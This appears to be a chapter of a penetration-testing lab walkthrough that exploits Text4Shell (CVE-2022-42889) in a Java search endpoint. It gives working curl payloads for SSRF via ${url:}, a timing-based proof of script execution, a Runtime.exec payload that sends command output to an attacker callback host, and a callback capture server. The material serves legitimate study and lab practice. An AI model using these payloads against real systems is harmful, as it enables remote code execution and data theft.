# 03 — Text4Shell: proving a blind RCE

The endpoint reflects nothing useful, so nothing in-band will ever confirm this bug. This chapter
builds two independent oracles — one out-of-band, one timing-based — that do not depend on the
response body at all.

| Step | Runs on |
|---|---|
| 3.1 Background: CVE-2022-42889 | — |
| 3.2 Start the callback listener | Kali |
| 3.3 Oracle 1 — SSRF proof of interpolation | Kali → target |
| 3.4 Oracle 2 — timing proof of code execution | Kali → target |
| 3.5 A path that did not work | Kali → target |

---

## 3.1 Background: CVE-2022-42889

Apache Commons Text's `StringSubstitutor` expands `${prefix:name}` expressions. When built with
`StringSubstitutor.createInterpolator()`, the default lookup chain includes:

| Lookup | What it does | Why it matters |
|---|---|---|
| `script` | evaluates a JSR-223 script (`javascript`, `groovy`, …) | arbitrary code in the server JVM |
| `url` | fetches a URL and returns the body | SSRF, and a way to read local files with `file:` |
| `dns` | resolves a hostname | blind DNS exfiltration |
| `sys`, `env` | JVM system properties / environment | information disclosure |
| `date`, `base64*`, `file*` | assorted helpers | minor |

Commons Text **1.5 through 1.9** enable `script`, `url` and `dns` by default. 1.10.0 removed them
from the default interpolator. The advisory is CVE-2022-42889, nicknamed **Text4Shell** after
Log4Shell, because the trigger syntax is nearly identical.

The `script` lookup resolves its engine through `javax.script.ScriptEngineManager`. On Java 11 the
**Nashorn** JavaScript engine ships with the JDK, so `javascript:` works out of the box — and Nashorn
gives the script full Java interop, which means `java.lang.Runtime` and `java.lang.ProcessBuilder`
are both reachable.

Chapter 02 established that this application speaks `${prefix:name}` and is a Java service. Now we
need to see it *act*.

## 3.2 Start the callback listener

A bare `python3 -m http.server` logs the request line but not the headers, and the `User-Agent` is
the single most valuable header here — it identifies the fetching JVM. So use a capture server that
records request lines **and** headers:

**On Kali**

```bash
mkdir -p ~/t4s && cd ~/t4s

cat > cap_server.py <<'EOS'
#!/usr/bin/env python3
"""Minimal raw HTTP capture server: logs each request line + headers to a file."""
import datetime
import socketserver
import sys

LOG = "callback_capture.log"


class Handler(socketserver.StreamRequestHandler):
    def handle(self):
        line = self.rfile.readline().decode("latin-1").strip()
        headers = []
        while True:
            h = self.rfile.readline().decode("latin-1").strip()
            if not h:
                break
            headers.append(h)
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG, "a") as fh:
            fh.write(f"[{ts}] {self.client_address[0]}:{self.client_address[1]} {line}\n")
            for h in headers:
                fh.write(f"[{ts}]   {h}\n")
        body = b"ok\n"
        self.wfile.write(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % len(body))
        self.wfile.write(body)


class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8899
    with Server(("0.0.0.0", port), Handler) as srv:
        print(f"capture server on {port}", flush=True)
        srv.serve_forever()
EOS

python3 -u cap_server.py 8899
```

```
capture server on 8899
```

Leave it running. Everything below arrives in this terminal, not in the curl output.

## 3.3 Oracle 1 — SSRF proves interpolation

**On Kali**

```bash
curl -sS -G --data-urlencode 'query=${url:UTF-8:http://192.168.45.158:8899/ssrf-proof}' \
  "http://192.168.237.150:8080/search"
```

```
{"query":"${url:UTF-8:http://192.168.45.158:8899/ssrf-proof}","result":""}
```

The response is, once again, nothing. But the listener terminal shows:

```
[2026-11-15 20:30:34] 192.168.237.150:46830 GET /ssrf-proof HTTP/1.1
[2026-11-15 20:30:34]   User-Agent: Java/11.0.16
[2026-11-15 20:30:34]   Host: 192.168.45.158:8899
[2026-11-15 20:30:34]   Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
[2026-11-15 20:30:34]   Connection: keep-alive
```

**Reading it — this is the finding:**

- The connection comes **from `192.168.237.150`**, the target. The server fetched a URL that we
  supplied. The `${url:...}` lookup ran.
- `User-Agent: Java/11.0.16` — the fetch was made by the JVM, not by a browser or a proxy.
- The `Accept` header is the JDK's `HttpURLConnection` default (`text/html, image/gif, image/jpeg,
  *; q=.2`), which nails it to `java.net.URL.openConnection()`.
- Therefore `${prefix:name}` **is** being interpolated, and the `url` lookup is enabled — which
  means this is an affected Commons Text version, and the `script` lookup is almost certainly in
  the same default chain.

The interpolated result never reaches us. That is irrelevant: the *side effect* proved the bug.

## 3.4 Oracle 2 — timing proves code execution

`${script:javascript:...}` gives us a JSR-223 engine. The cheapest robust oracle is a sleep — it
needs no network, works even if egress is filtered, and produces a signal that cannot be confused
with anything else: wall-clock time.

Baseline and payload, measured the same way:

**On Kali**

```bash
for p in 'baseline123' '${script:javascript:java.lang.Thread.sleep(4000)}'; do
  S=$(date +%s%N)
  curl -sS -m 30 -G --data-urlencode "query=$p" "http://192.168.237.150:8080/search" > /dev/null
  E=$(date +%s%N)
  echo "payload=$p elapsed_ms=$(( (E-S)/1000000 ))"
done
```

```
payload=baseline123 elapsed_ms=142
payload=${script:javascript:java.lang.Thread.sleep(4000)} elapsed_ms=4175
```

Repeating the measurement at three sleep values, same command shape:

```
arg=0      baseline                                    146 ms
arg=1000   Thread.sleep(1000)                         1173 ms
arg=3000   Thread.sleep(3000)                         3208 ms
arg=4000   Thread.sleep(4000)                         4175 ms
```

**Reading it:**

- Baseline 142 ms; the sleep payload 4175 ms. The delta is ~4.03 s for a 4 s sleep — the request
  thread was blocked by *our* JavaScript.
- Subtract the baseline from the series above and you get 1027 ms, 3062 ms and 4029 ms for 1 s, 3 s
  and 4 s of sleep. The delay is linear in the payload's own argument, which rules out network jitter
  and slow queries as explanations.
- `java.lang.Thread` was reachable from inside the script, which means **full Java interop**. A
  sandboxed engine would have thrown on the class reference instead of sleeping.

At this point the box is owned in principle: arbitrary Java in a JVM means `Runtime.exec`.

One practical note: this oracle blocks a request thread for the whole sleep. Keep sleeps short and
do not parallelise them — a handful of 4-second probes is plenty, and hammering the endpoint with
60-second sleeps is a good way to knock the service over.

## 3.5 A path that did not work

Worth recording, because it looks like it should work and cost time. The obvious next step is to
exfiltrate command output over HTTP from inside the `script` block:

**On Kali** (did not produce a callback)

```bash
curl -sS -G --data-urlencode 'query=${script:javascript:var p=java.lang.Runtime.getRuntime().exec("id");var s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\A").next();new java.net.URL("http://192.168.45.158:8899/exfil?d="+java.net.URLEncoder.encode(s,"UTF-8")).openStream().close();}' \
  "http://192.168.237.150:8080/search"
```

Also tried, also silent:

```bash
curl -sS -G --data-urlencode 'query=${script:javascript:new java.net.URL("http://192.168.45.158:8899/jsNet").openStream().close();}' \
  "http://192.168.237.150:8080/search"
```

No callback ever arrived for a `java.net.URL` opened **from inside the script block**, while the
`${url:}` lookup (same JVM, same network path, executed by Commons Text's own code) worked every
time. The engine evaluated `Thread.sleep` and, in chapter 04, `ProcessBuilder` without complaint.

The exact cause was not established — a `SecurityManager` installed for the script engine, or a
Nashorn classloader restriction on socket APIs, would both explain it. It was not investigated
further because a working alternative exists: **run a shell instead of trying to read a process's
stdout in Java.** → [04 — Foothold](04-foothold.md)
